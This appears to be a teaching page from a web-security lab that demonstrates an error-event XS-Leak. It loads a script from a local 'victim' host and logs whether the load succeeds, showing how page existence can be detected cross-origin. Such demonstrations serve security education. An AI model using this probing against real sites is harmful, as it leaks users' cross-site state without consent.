<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Attack - Error Events</title>
    <script>
        function testExploit(url) {
            // Create and append an iframe
            const script = document.createElement('script');
            script.src = url;

            script.onload = () => {
                console.log("Attempt to load data from\n '" + url + "' \nwas successful.");
            }

            document.body.appendChild(script);
        }
    </script>
</head>

<body>
    <h1>Error Events XS-Leak Attack</h1>
    <ul>
        <li><a href="../index.html">Home</a></li>
    </ul>

    <h2>Instructions</h2>
    <p>This page demonstrates an XS-Leak attack based on error events.</p>
    <p>To inspect the status of the requests, follow these steps:</p>
    <ol>
        <li>Open your browser's Developer Tools (F12 or right-click and choose "Inspect").</li>
        <li>Go to the <strong>Network</strong> tab.</li>
        <li>Click one of the buttons below to trigger an attack.</li>
        <li>Check the Network tab for the request's <strong>Status Code</strong> (200 for success, 404 for failure).</li>
    </ol>

    <h3>Existing Webpage</h3>
    <p>This will check whether <a href="http://victim.local:8080/xs-leaks/error-events.html">this</a> webpage is available (it is).</p>
    <p>
        <button onclick="testExploit('http\:\/\/victim.local:8080/xs-leaks/error-events.html')">Test Existing Page (Success)</button>
    </p>

    <h3>Non-Existing Webpage</h3>
    <p>This will check whether <a href="http://victim.local:8080/xs-leaks/404">this</a> webpage is available (it is not).</p>
    <p>
        <button onclick="testExploit('http\:\/\/victim.local:8080/xs-leaks/404')">Test Non-Existing Page (Failure)</button>
    </p>

    <div id="message"></div>
</body>

</html>
